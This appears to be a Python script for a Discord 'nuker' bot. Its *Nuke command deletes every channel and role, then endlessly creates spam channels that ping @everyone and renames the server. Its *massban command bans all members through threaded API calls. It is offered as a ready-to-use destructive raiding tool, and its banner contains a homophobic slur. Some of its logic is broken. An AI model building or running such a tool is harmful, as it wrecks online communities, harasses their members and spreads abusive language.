from distutils.command.config import config
from distutils.log import error
from email import message
from errno import errorcode
from http import server
from lib2to3.pgen2.token import GREATER
import os
import threading
from tkinter import E
from wsgiref import headers
import requests
from telnetlib import STATUS
from turtle import title
from unicodedata import name
import discord
import time
import colorama
colorama.init()
from colorama import Fore 




ospath = os.path.abspath("main.py")


print(f"{Fore.GREEN}" "Loading Nuker.....")
time.sleep(4)
print(f"{Fore.LIGHTMAGENTA_EX}" +"""



███████╗██╗███╗░░██╗██╗░░██╗███████╗██╗████████╗░██████╗██████╗░░█████╗░██╗░░██╗████████╗
██╔════╝██║████╗░██║██║░░██║██╔════╝██║╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║░██╔╝╚══██╔══╝
█████╗░░██║██╔██╗██║███████║█████╗░░██║░░░██║░░░╚█████╗░██████╔╝███████║█████═╝░░░░██║░░░
██╔══╝░░██║██║╚████║██╔══██║██╔══╝░░██║░░░██║░░░░╚═══██╗██╔═══╝░██╔══██║██╔═██╗░░░░██║░░░
███████╗██║██║░╚███║██║░░██║███████╗██║░░░██║░░░██████╔╝██║░░░░░██║░░██║██║░╚██╗░░░██║░░░
╚══════╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝╚═╝░░░╚═╝░░░╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░

 Made by C R A B#1592 on Discord | If you skid you're a faggot                                                                               
                                                                                 
                                                                                 """ + f"{Fore.GREEN}")
print(f"{Fore.RED}[1] - Nuke Server")
print(f"{Fore.RED}[2] - Mass unban")
print(f"{Fore.RED}[3] - Mass ban")

options = input("Choice: ")
if options == 1:
    pass

print("*Nuke to nuke the server!")
    
    





from discord.ext import commands
from discord.utils import get 



configFile = open('config.txt', mode='r')
delimeter = '='




def findValue(fullString):
    fullString = fullString.rstrip('\n')
    value = fullString[fullString.index(delimeter)+1:]
    value = value.replace(" ","")
    return value

for line in configFile:
    if line.startswith('token'):
        token = findValue(line)
        
        if token == None:
            print("No token detected! quitting")
            quit
    if line.startswith('channels'):
        channelName = findValue(line)
       
    if line.startswith('message'):
        messageToSpam = findValue(line)
       
    if line.startswith('name'):
        serverName = findValue(line)
    if line.startswith('role'):
        role = findValue(line)


bot = commands.Bot(command_prefix= "*", case_insensitive = True, help_command=None, intents = discord.Intents.all())
title = "Made by C R A B#1592"
@bot.command()
@commands.has_permissions(ban_members=True)
async def Nuke(ctx):
    await ctx.message.delete()
    allowed_mentions= discord.AllowedMentions(everyone=True)
    allowed_bans = commands.has_permissions(ban_members = True)
    guild = ctx.message.guild
    author = ctx.author.id
    for c in ctx.guild.channels:
        await c.delete()
        if errorcode == "10003":
            pass
        print(f"{Fore.GREEN}" + f"Succesfully deleted {c}")
    else:
        if errorcode == "10003":
            print(f"{Fore.RED} Couldn't delete {c}")

    
    for v in ctx.guild.voice_channels:
        await v.delete()
        if errorcode == "10003":
            pass
        print(f"{Fore.GREEN}" + f"Succesfully deleted {v}")
    else:
        if errorcode == "10003":
            print(f"{Fore.RED} Couldn't delete {v}")
            pass

    for role in ctx.guild.roles:  
     try:  
        await role.delete()
     except:
        await ctx.send(f"{Fore.RED}" + f"Cannot delete {role.name}")

   
     
    
    
    while True:
        channels = await guild.create_text_channel(channelName)
        await channels.send(content = messageToSpam, allowed_mentions = allowed_mentions)
        await guild.edit(name = serverName)
        guild = ctx.guild
        await guild.create_role(name= role)
        print(f"{Fore.GREEN}" + f"Created Role {role}")
        print(f"{Fore.GREEN}" + f"Created {channelName}")
        if errorcode == "30005":
            print(f"{Fore.RED} Unsucessful!")
            pass
        if errorcode == "50074":
            print(f"{Fore.RED} Unsucessful!")
            pass
        if errorcode == "10003":
            print(f"{Fore.RED} Unsucessful!")
            pass
        
   

headers = {
        "Authorization":
        f"Bot {token}"
    }


if options == 3:
    print(Fore.GREEN + "Massban configured! Send *massban in chat to ban all members <3")
@bot.command()
async def massban(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id

    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
            headers=headers
        )

    for i in range(3):
        for member in list(ctx.guild.members):
            threading.Thread(
                print(Fore.GREEN + "Massbanning all members...."),
                target=mass_ban,
                args=(member.id,),
                
            ).start()


if options == 2:
    print(Fore.GREEN + "Mass unban configured! *massunban in chat to massunban all members!")
@bot.command()
async def massunban(ctx):
        banlist = await ctx.guild.bans()
        for users in banlist:
            try:
                await ctx.guild.unban(user=users.user)
            except:
                pass
        await ctx.send(f"unbanned {users}")
        

           
    

        
        
    
time.sleep(4)

bot.run(token)


